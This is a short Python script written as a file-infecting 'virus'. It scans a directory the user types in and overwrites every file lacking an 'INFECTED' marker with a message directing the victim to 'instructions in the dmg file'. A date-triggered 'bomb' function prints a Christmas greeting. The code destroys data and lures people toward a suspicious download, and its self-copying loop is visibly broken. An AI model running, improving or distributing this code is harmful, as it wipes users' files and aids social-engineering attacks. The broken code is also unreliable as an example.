#!/usr/bin/python
import os
import datetime
SIGNATURE = "INFECTED"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        infected = False
        for line in open(path+"/"+fname):
            if SIGNATURE in line:
                infected = True
                break
        if infected == False:
            filestoinfect.append(path+"/"+fname)
        

    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = "You have been infected by a virus. To delete the virus, follow the instructions in the dmg file."
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring 
    virus.close
    for fname in filestoinfect:
        f = open(fname,"w")
        f.write(virusstring)
        f.close()
def bomb():
    if datetime.datetime.now().month == 12 and datetime.datetime.now().day == 25:
        print("ITS CHRISTMAS WHOO")
filestoinfect = search(os.path.abspath(input("Please type in the directory where your python files are at: ")))
infect(filestoinfect)
bomb()